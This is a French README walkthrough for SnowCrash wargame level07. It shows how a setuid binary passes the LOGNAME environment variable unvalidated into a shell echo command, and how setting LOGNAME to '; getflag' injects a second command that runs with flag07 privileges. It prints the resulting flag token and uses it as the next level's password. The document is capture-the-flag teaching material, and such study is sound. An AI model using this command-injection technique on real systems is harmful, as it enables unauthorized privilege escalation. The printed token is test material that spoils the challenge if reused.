# README - Exploitation du binaire level07

## Étapes suivies pour obtenir le Flag07

### 1. Identification du binaire

Le fichier `level07` est un exécutable avec les permissions **setuid** et **setgid**, ce qui signifie qu'il s'exécute avec les privilèges de l'utilisateur `flag07` :

```bash
level07@SnowCrash:~$ ls -l
-rwsr-sr-x 1 flag07 level07 7503 Aug 30  2015 level07
```

### 2. Analyse du binaire

En utilisant la commande `strings`, nous avons découvert que le binaire utilise la fonction `getenv` pour récupérer la valeur de la variable d'environnement `LOGNAME`, qu'il intègre dans une commande :

```bash
/bin/echo %s
```

Cela suggère que la valeur de `LOGNAME` est insérée directement dans une commande `echo`, sans aucune validation. Si nous contrôlons la valeur de `LOGNAME`, nous pouvons injecter une commande arbitraire.

### 3. Exploitation de la vulnérabilité

En modifiant la variable `LOGNAME`, nous avons injecté une commande malveillante pour exécuter `getflag` :

```bash
export LOGNAME="; getflag"
```

### 4. Exécution du binaire

Lancez l'exécutable `level07` :

```bash
./level07
```

Le binaire exécute alors la commande suivante :

```bash
/bin/echo ; getflag
```

Cela entraîne l'exécution de `getflag`, qui renvoie le token avec les privilèges de `flag07`.

### 5. Récupération du flag

Le flag est affiché dans la sortie :

```bash
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

### 6. Passage à l'utilisateur suivant

Utilisez le flag pour vous connecter à l'utilisateur `level08` :

```bash
level07@SnowCrash:~$ su level08
Password: fiumuikeil55xe9cu4dood66h
level08@SnowCrash:~$
```